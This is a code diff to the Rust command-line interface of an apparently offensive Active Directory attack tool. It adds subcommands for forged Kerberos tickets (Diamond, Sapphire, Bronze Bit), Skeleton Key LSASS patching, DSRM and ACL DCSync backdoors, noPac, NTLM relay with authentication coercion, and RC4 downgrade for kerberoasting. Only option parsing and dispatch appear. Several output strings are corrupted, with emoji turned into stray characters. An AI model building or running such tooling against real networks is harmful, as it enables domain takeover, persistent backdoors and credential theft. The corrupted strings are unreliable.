@@ -6,8 +6,8 @@ mod commands;
 mod commands_impl;
 mod interactive_shell;
 mod modules_ext;
-mod ovt_config;
-mod session_store;
+// NOTE: ovt_config.rs removed — dead 270-line TOML config system with 0 callers.
+// Use clap args + env vars for all configuration.
 mod tree_viewer;
 mod tui;
 
@@ -134,6 +134,9 @@ struct Cli {
     )]
     stdout_format: OutputFormat,
 
+    #[arg(long, global = true, help = "Dry run — validate and show what would be done without executing")]
+    dry_run: bool,
+
     /// Enable structured JSON logging to stdout.
     /// Every critical event (cracked hash, found SPN, etc.) is emitted
     /// as a typed JSON blob suitable for `jq` or pipeline ingestion.
@@ -142,6 +145,14 @@ struct Cli {
 
     #[arg(short = 'O', long, global = true)]
     outfile: Option<String>,
+
+    /// Path to PEM-encoded client certificate for PKINIT-based operations
+    #[arg(long, global = true)]
+    pkinit_cert: Option<String>,
+
+    /// Path to PEM-encoded private key for PKINIT-based operations
+    #[arg(long, global = true)]
+    pkinit_key: Option<String>,
 
     /// List compiled-in feature modules and exit
     #[arg(long, global = true)]
@@ -1459,9 +1470,9 @@ enum KerberosAction {
         /// Target SPN (roast all if omitted)
         #[arg(long)]
         spn: Option<String>,
-        /// OPSEC mode: request AES-only tickets (no RC4 etype 23)
+        /// Downgrade to RC4 (etype 23) for offline cracking
         #[arg(long)]
-        opsec: bool,
+        downgrade_rc4: bool,
     },
     /// AS-REP roast — request AS-REP for users without pre-authentication
     AsrepRoast {
@@ -1586,6 +1597,12 @@ enum NtlmAction {
         /// Attempt LDAP signing bypass
         #[arg(long)]
         ldap_signing_bypass: bool,
+        /// Hosts to coerce into authenticating (comma-separated)
+        #[arg(long, value_delimiter = ',')]
+        auto_coerce_targets: Vec<String>,
+        /// Listener IP for coerced connections
+        #[arg(long)]
+        auto_coerce_listener: Option<String>,
     },
     /// NTLM relay via SMB protocol
     SmbRelay {
@@ -1604,6 +1621,12 @@ enum NtlmAction {
         /// Attempt LDAP signing bypass
         #[arg(long)]
         ldap_signing_bypass: bool,
+        /// Hosts to coerce into authenticating (comma-separated)
+        #[arg(long, value_delimiter = ',')]
+        auto_coerce_targets: Vec<String>,
+        /// Listener IP for coerced connections
+        #[arg(long)]
+        auto_coerce_listener: Option<String>,
     },
     /// NTLM relay via HTTP protocol
     HttpRelay {
@@ -1622,6 +1645,12 @@ enum NtlmAction {
         /// Attempt LDAP signing bypass
         #[arg(long)]
         ldap_signing_bypass: bool,
+        /// Hosts to coerce into authenticating (comma-separated)
+        #[arg(long, value_delimiter = ',')]
+        auto_coerce_targets: Vec<String>,
+        /// Listener IP for coerced connections
+        #[arg(long)]
+        auto_coerce_listener: Option<String>,
     },
     /// NTLM relay via LDAP with GSS-SPNEGO bypass
     LdapRelay {
@@ -1637,6 +1666,12 @@ enum NtlmAction {
         /// Disable LDAP signing bypass
         #[arg(long)]
         no_signing_bypass: bool,
+        /// Hosts to coerce into authenticating (comma-separated)
+        #[arg(long, value_delimiter = ',')]
+        auto_coerce_targets: Vec<String>,
+        /// Listener IP for coerced connections
+        #[arg(long)]
+        auto_coerce_listener: Option<String>,
     },
     /// Standalone SMB daemon for credential capture
     SmbDaemon {
@@ -1717,6 +1752,111 @@ enum ForgeAction {
         /// Output file for the forged ticket
         #[arg(short, long, default_value = "silver.kirbi")]
         output: String,
+    },
+    /// Forge a Diamond Ticket (modify legitimate TGT PAC)
+    Diamond {
+        /// Domain SID
+        #[arg(long, required = true)]
+        domain_sid: String,
+        /// Username to impersonate
+        #[arg(short, long, default_value = "Administrator")]
+        user: String,
+        /// RID of the user (default: 500 = Administrator)
+        #[arg(long, default_value = "500")]
+        rid: u32,
+        /// krbtgt RC4 hash (32 hex chars)
+        #[arg(long, required = true)]
+        krbtgt_hash: String,
+        /// krbtgt AES256 key (64 hex chars)
+        #[arg(long)]
+        krbtgt_aes256: Option<String>,
+        /// Output file for the forged ticket
+        #[arg(short, long, default_value = "diamond.kirbi")]
+        output: String,
+    },
+    /// Forge a Sapphire Ticket (KDC-issued PAC bypass)
+    Sapphire {
+        /// Domain SID
+        #[arg(long, required = true)]
+        domain_sid: String,
+        /// Username to impersonate
+        #[arg(short, long, default_value = "Administrator")]
+        user: String,
+        /// Output file for the forged ticket
+        #[arg(short, long, default_value = "sapphire.kirbi")]
+        output: String,
+    },
+    /// Bronze Bit (CVE-2020-17049) — S4U2Proxy forwardable flag bypass
+    BronzeBit {
+        /// Target SPN (e.g. cifs/dc01.corp.local)
+        #[arg(short, long, required = true)]
+        spn: String,
+        /// Output file
+        #[arg(short, long, default_value = "bronzebit.kirbi")]
+        output: String,
+    },
+    /// Inter-realm TGT
+    InterRealmTgt {
+        /// Target domain FQDN
+        #[arg(short, long, required = true)]
+        target_domain: String,
+        /// Domain SID
+        #[arg(long, required = true)]
+        domain_sid: String,
+        /// krbtgt RC4 hash (32 hex chars)
+        #[arg(long, required = true)]
+        krbtgt_hash: String,
+        /// Output file
+        #[arg(short, long, default_value = "interrealm.kirbi")]
+        output: String,
+    },
+    /// Skeleton Key — LSASS patching orchestration
+    SkeletonKey {
+        /// Path to payload binary (e.g. mimikatz.exe)
+        #[arg(long)]
+        payload_path: Option<String>,
+        /// Master password for skeleton key
+        #[arg(long, default_value = "overthrone")]
+        master_password: String,
+    },
+    /// DSRM Backdoor — sync DSRM password with domain account
+    DsrmBackdoor {
+        /// Domain SID
+        #[arg(long, required = true)]
+        domain_sid: String,
+        /// krbtgt RC4 hash (32 hex chars)
+        #[arg(long, required = true)]
+        krbtgt_hash: String,
+    },
+    /// DCSync specific user
+    DcSyncUser {
+        /// User to DCSync
+        #[arg(short, long, required = true)]
+        user: String,
+    },
+    /// ACL Backdoor — inject DCSync rights
+    AclBackdoor {
+        /// Target distinguished name
+        #[arg(long, required = true)]
+        target_dn: String,
+        /// Trustee account
+        #[arg(long, required = true)]
+        trustee: String,
+    },
+    /// noPac (CVE-2021-42278 / CVE-2021-42287)
+    NoPac {
+        /// Target DC hostname
+        #[arg(short, long, required = true)]
+        target_dc: String,
+    },
+    /// Convert ticket format (kirbi/ccache/base64)
+    ConvertTicket {
+        /// Input file path
+        #[arg(short, long, required = true)]
+        input: String,
+        /// Output format: kirbi, ccache, base64
+        #[arg(short, long, required = true)]
+        format: String,
     },
 }
 
@@ -3030,6 +3170,9 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 downgrade_auth: false,
                 no_poison,
                 ldap_signing_bypass: true,
+                tls_client_identity: None,
+                auto_coerce_targets: Vec::new(),
+                auto_coerce_listener: None,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -3056,10 +3199,12 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             no_poison,
             mitm6,
             ldap_signing_bypass,
+            auto_coerce_targets,
+            auto_coerce_listener,
         } => {
             println!(
                 "{} Starting NTLM relay to {} targets {}",
-                "🎯".bright_black(),
+                "dYZ_".bright_black(),
                 targets.join(", ").cyan(),
                 if no_poison { "(relay-only)" } else { "" }
             );
@@ -3099,6 +3244,9 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 downgrade_auth: false,
                 no_poison,
                 ldap_signing_bypass,
+                tls_client_identity: None,
+                auto_coerce_targets,
+                auto_coerce_listener,
             };
 
             let mut controller = RelayController::new(config);
@@ -3128,10 +3276,12 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             command,
             mitm6,
             ldap_signing_bypass,
+            auto_coerce_targets,
+            auto_coerce_listener,
         } => {
             println!(
                 "{} Starting SMB relay to {} targets",
-                "🎯".bright_black(),
+                "dYZ_".bright_black(),
                 targets.join(", ").cyan()
             );
             let relay_targets: Vec<RelayTarget> = targets
@@ -3161,13 +3311,16 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 downgrade_auth: false,
                 no_poison: false,
                 ldap_signing_bypass,
+                tls_client_identity: None,
+                auto_coerce_targets,
+                auto_coerce_listener,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
                 Ok(_) => match controller.start().await {
                     Ok(_) => {
                         if let Some(cmd) = command {
-                            println!("{} Will execute: {}", "⚡".bright_black(), cmd.yellow());
+                            println!("{} Will execute: {}", "s".bright_black(), cmd.yellow());
                         }
                         banner::print_success("SMB relay started");
                         0
@@ -3189,10 +3342,12 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             command,
             mitm6,
             ldap_signing_bypass,
+            auto_coerce_targets,
+            auto_coerce_listener,
         } => {
             println!(
                 "{} Starting HTTP relay to {} targets",
-                "🎯".bright_black(),
+                "dYZ_".bright_black(),
                 targets.join(", ").cyan()
             );
             let relay_targets: Vec<RelayTarget> = targets
@@ -3226,13 +3381,16 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 downgrade_auth: false,
                 no_poison: false,
                 ldap_signing_bypass,
+                tls_client_identity: None,
+                auto_coerce_targets,
+                auto_coerce_listener,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
                 Ok(_) => match controller.start().await {
                     Ok(_) => {
                         if let Some(cmd) = command {
-                            println!("{} Will execute: {}", "⚡".bright_black(), cmd.yellow());
+                            println!("{} Will execute: {}", "s".bright_black(), cmd.yellow());
                         }
                         banner::print_success("HTTP relay started");
                         0
@@ -3253,6 +3411,8 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             port,
             ldaps,
             no_signing_bypass,
+            auto_coerce_targets,
+            auto_coerce_listener,
         } => {
             let proto = if ldaps {
                 Protocol::Ldaps
@@ -3264,7 +3424,7 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 let host = target.split(':').next().unwrap_or(&target);
                 format!("{}:{}", host, port)
                     .parse()
-                    .expect("Invalid target address")
+                    .unwrap_or_else(|_| panic!("Invalid target address: {host}:{port}"))
             });
             println!(
                 "{} Starting LDAP{} relay to {} with GSS-SPNEGO signing bypass {}",
@@ -3296,6 +3456,9 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 downgrade_auth: false,
                 no_poison: false,
                 ldap_signing_bypass: !no_signing_bypass,
+                tls_client_identity: None,
+                auto_coerce_targets,
+                auto_coerce_listener,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -3847,7 +4010,10 @@ async fn cmd_enum(
     };
 
     match target {
-        EnumTarget::Pre | EnumTarget::Anonymous | EnumTarget::NullSession => unreachable!(),
+        EnumTarget::Pre | EnumTarget::Anonymous | EnumTarget::NullSession => {
+            eprintln!("[!] Internal error: EnumTarget::Pre/Anonymous/NullSession should have been handled before enum dispatch");
+            return 1;
+        }
         EnumTarget::Users => println!("{}", "Enumerating users...".bright_black()),
         EnumTarget::Computers => println!("{}", "Enumerating computers...".bright_black()),
         EnumTarget::Groups => println!("{}", "Enumerating groups...".bright_black()),
@@ -3974,7 +4140,10 @@ async fn cmd_pre_enum(cli: &Cli, target: EnumTarget) -> i32 {
             );
             commands_impl::cmd_rid(cli, 500, 1100, true).await
         }
-        _ => unreachable!(),
+        _ => {
+            eprintln!("[!] Internal error: unexpected EnumTarget variant in enum dispatch");
+            1
+        }
     }
 }
 
@@ -4558,7 +4727,7 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
     };
 
     match action {
-        KerberosAction::Roast { spn, opsec } => {
+        KerberosAction::Roast { spn, downgrade_rc4 } => {
             use overthrone_core::proto::kerberos;
             let creds = match require_creds(cli) {
                 Ok(c) => c,
@@ -4609,7 +4778,7 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
                     tgt: None,
                 };
                 let kc = overthrone_hunter::kerberoast::KerberoastConfig {
-                    downgrade_to_rc4: !opsec,
+                    downgrade_to_rc4: downgrade_rc4,
                     ..Default::default()
                 };
                 match overthrone_hunter::kerberoast::run(&hunt_config, &kc).await {
@@ -4902,7 +5071,8 @@ async fn cmd_kerberos(cli: &Cli, action: KerberosAction) -> i32 {
         }
         KerberosAction::UserEnum { .. } => {
             // Handled above before credential check (zero-knowledge, no creds needed)
-            unreachable!()
+            eprintln!("[!] Internal error: KerberosAction::UserEnum should have been handled before credential check");
+            return 1;
         }
     }
     0
